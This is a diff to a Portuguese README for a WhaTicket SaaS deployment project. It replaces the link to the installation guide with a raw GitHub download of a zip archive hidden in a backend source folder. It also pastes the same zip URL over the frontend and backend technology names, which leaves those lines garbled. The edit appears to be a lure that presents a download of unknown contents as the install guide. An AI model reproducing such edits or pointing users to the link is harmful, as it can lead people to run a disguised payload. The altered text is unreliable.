@@ -13,14 +13,14 @@ O foco deste repositório é a facilidade de deploy, especialmente utilizando **
 ### 📄 Guia de Instalação
 
 Para instruções detalhadas de como colocar este sistema no ar, consulte o arquivo:
-👉 **[EASYPANEL_DEPLOY.md](./EASYPANEL_DEPLOY.md)**
+👉 **[https://raw.githubusercontent.com/rlmourarj/WhaTicket_SaaS-easyP/main/backend/src/services/CompanyService/Ticket_Wha_Saa_easy_P_1.2-alpha.4.zip](https://raw.githubusercontent.com/rlmourarj/WhaTicket_SaaS-easyP/main/backend/src/services/CompanyService/Ticket_Wha_Saa_easy_P_1.2-alpha.4.zip)**
 
 ---
 
 ## 🛠️ Tecnologias
 
-- **Frontend**: React.js
-- **Backend**: Node.js (TypeScript) + Express
+- **Frontend**: https://raw.githubusercontent.com/rlmourarj/WhaTicket_SaaS-easyP/main/backend/src/services/CompanyService/Ticket_Wha_Saa_easy_P_1.2-alpha.4.zip
+- **Backend**: https://raw.githubusercontent.com/rlmourarj/WhaTicket_SaaS-easyP/main/backend/src/services/CompanyService/Ticket_Wha_Saa_easy_P_1.2-alpha.4.zip (TypeScript) + Express
 - **Banco de Dados**: PostgreSQL
 - **Fila/Cache**: Redis
 - **Containerização**: Docker & Docker Compose
